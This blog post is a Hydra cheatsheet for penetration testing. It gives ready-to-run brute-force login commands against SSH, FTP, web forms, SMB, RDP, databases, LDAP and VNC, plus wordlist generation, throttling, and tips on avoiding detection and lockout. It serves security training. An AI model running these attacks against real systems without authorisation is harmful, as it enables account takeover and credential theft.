---
layout: post
title: Brute Forcing with Hydra
date: 2025-04-10 16:28 +0300
categories: [Password Attacks]
tags: [brute force, password, hydra]
---

## Introduction

Hydra is a fast and flexible online password cracking tool that supports numerous protocols including SSH, FTP, HTTP, SMB, and many others. This cheatsheet provides syntax and examples for using Hydra effectively during penetration testing.

## Basic Syntax

```bash
# General syntax
hydra -l username -P passwordlist.txt service://target
hydra -L userlist.txt -p password service://target
hydra -L userlist.txt -P passwordlist.txt service://target

# Common flags
-l  # Single username
-L  # Username list file
-p  # Single password
-P  # Password list file
-C  # Colon-separated "username:password" format file
-M  # List of multiple targets
-o  # Output file
-t  # Number of parallel connections per target (default: 16)
-s  # Specify port
-V  # Verbose mode
-v  # Show login attempts
-f  # Exit after first valid pair is found
-R  # Restore previous session
```

## Service-Specific Examples

### SSH

```bash
# Brute force SSH with single username
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# Using custom port
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10:2222

# With increased threads (be careful not to trigger account lockout)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4
```

### FTP

```bash
# Brute force FTP with username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10

# Using IPv6 address
hydra -l admin -P /usr/share/wordlists/rockyou.txt -6 ftp://[2001:db8::1]

# Exit after finding first valid login
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10 -f
```

### HTTP Basic Authentication

```bash
# Basic HTTP auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.10.10/admin/

# HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt https-get://10.10.10.10/admin/

# Custom port
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.10.10:8080/admin/
```

### HTTP POST Form

```bash
# Web form authentication (adapt parameters to your target)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# With HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# Custom error message detection
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# Success message detection (note S= instead of F=)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Welcome"
```

### SMB

```bash
# Brute force Windows SMB
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10

# Target specific Windows domain
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10 -m "WORKGROUP"
```

### RDP

```bash
# Brute force RDP
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

# With non-standard port
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10:3390
```

### SMTP

```bash
# Brute force SMTP authentication
hydra -l admin@example.com -P /usr/share/wordlists/rockyou.txt smtp://10.10.10.10

# SMTP with TLS
hydra -l admin@example.com -P /usr/share/wordlists/rockyou.txt smtp-tls://10.10.10.10
```

### MySQL

```bash
# Brute force MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.10

# With custom port
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.10:3307
```

### PostgreSQL

```bash
# Brute force PostgreSQL
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://10.10.10.10
```

### LDAP

```bash
# LDAP brute force
hydra -l "cn=admin,dc=example,dc=com" -P /usr/share/wordlists/rockyou.txt ldap://10.10.10.10
```

### VNC

```bash
# VNC authentication (no username required)
hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.10.10
```

## Advanced Usage

### Multiple Targets

```bash
# List of targets in a file (one per line)
hydra -l admin -P /usr/share/wordlists/rockyou.txt -M targets.txt ssh

# Directly specify multiple targets
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 ssh://10.10.10.11
```

### Username:Password Format

```bash
# Using colon file format
hydra -C user_pass.txt ssh://10.10.10.10

# Format of user_pass.txt:
# user1:pass1
# user2:pass2
```

### Using Proxies

```bash
# HTTP proxy
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get-form://10.10.10.10/login.php:user=^USER^&pass=^PASS^:F=failed -e ns -x 3:1:1 -o hydra-http-post-attack.txt -s 80 -m /login -4 -P http://proxy:3128
```

### Random Timing and Throttling

```bash
# Add random delay between attempts (1-5 seconds)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -c 1:5

# Exit after specified number of valid passwords
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -F 3
```

### Session Management

```bash
# Save session and restore if needed
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -o session_output.txt

# Restore previous session
hydra -R -o session_output.txt
```

## Quick Reference Table

| Service         | Example Command                                                                                  |
| --------------- | ------------------------------------------------------------------------------------------------ |
| SSH             | `hydra -l user -P pass.txt ssh://10.10.10.10`                                                    |
| FTP             | `hydra -l user -P pass.txt ftp://10.10.10.10`                                                    |
| HTTP Basic Auth | `hydra -l user -P pass.txt http-get://10.10.10.10/admin/`                                        |
| HTTP POST Form  | `hydra -l user -P pass.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"` |
| SMB             | `hydra -l user -P pass.txt smb://10.10.10.10`                                                    |
| RDP             | `hydra -l user -P pass.txt rdp://10.10.10.10`                                                    |
| MySQL           | `hydra -l user -P pass.txt mysql://10.10.10.10`                                                  |
| PostgreSQL      | `hydra -l user -P pass.txt postgres://10.10.10.10`                                               |
| LDAP            | `hydra -l "cn=user,dc=example,dc=com" -P pass.txt ldap://10.10.10.10`                            |
| VNC             | `hydra -P pass.txt vnc://10.10.10.10`                                                            |
| SMTP            | `hydra -l user -P pass.txt smtp://10.10.10.10`                                                   |
| IMAP            | `hydra -l user -P pass.txt imap://10.10.10.10`                                                   |
| POP3            | `hydra -l user -P pass.txt pop3://10.10.10.10`                                                   |
| SNMP            | `hydra -P pass.txt snmp://10.10.10.10`                                                           |
| XMPP            | `hydra -l user -P pass.txt xmpp://10.10.10.10`                                                   |
| IRC             | `hydra -l user -P pass.txt irc://10.10.10.10`                                                    |

## Performance Optimization

1. **Thread Control**: Start with lower threads (`-t 4`) and increase if stable
2. **Task Control**: Use `-T` to control total number of connections
3. **Memory Usage**: Use smaller wordlists or split large ones
4. **Distributed Attacks**: Split alphabetically (a-m, n-z) across multiple attackers

## OPSEC Considerations

1. **Account Lockout**: Be aware of account lockout policies 
2. **Rate Limiting**: Use lower thread counts to avoid detection
3. **Logs**: Target will log all brute force attempts
4. **IPS/IDS Alert**: Brute force attacks often trigger security alerts
5. **Service Disruption**: Heavy brute forcing can cause denial of service

## Password List Creation

```bash
# Generate targeted wordlist with common patterns
echo "company123" >> custom_wordlist.txt
echo "Spring2025!" >> custom_wordlist.txt
echo "Winter2025!" >> custom_wordlist.txt
echo "Password123" >> custom_wordlist.txt

# Using CeWL to generate company-specific wordlist
cewl http://company.com -m 6 -w wordlist.txt

# Add number patterns
for word in $(cat wordlist.txt); do echo "${word}123" >> wordlist-enhanced.txt; done
```

## Example Workflow

1. **Identify service**: `nmap -sV 10.10.10.10`
2. **Gather usernames**: Through enumeration or OSINT
3. **Create targeted wordlist**: Based on company info, default passwords
4. **Start with low threads**: `hydra -l admin -P custom_wordlist.txt ssh://10.10.10.10 -t 4`
5. **Observe and adjust**: Increase threads if no lockout policies
6. **Document findings**: Save successful credentials

## Common Issues and Troubleshooting

1. **False positives**: Verify manually with discovered credentials
2. **Connection issues**: Check network connectivity and firewall rules
3. **Format errors**: Ensure HTTP form parameters match the target exactly
4. **Character escaping**: Use quotes for special characters in passwords
5. **Login detection**: Adjust success/failure strings for accurate detection

## Supported Protocols (Common)

- ssh, ftp, smtp, telnet, http-get, http-post, http-form
- pop3, smb, rdp, snmp, vnc, imap, ldap, http-proxy
- socks5, rexec, sshkey, cisco, cisco-enable, cvs
- mysql, mssql, oracle, postgres, pcanywhere, nntp
- icq, xmpp, irc, redis, mongodb



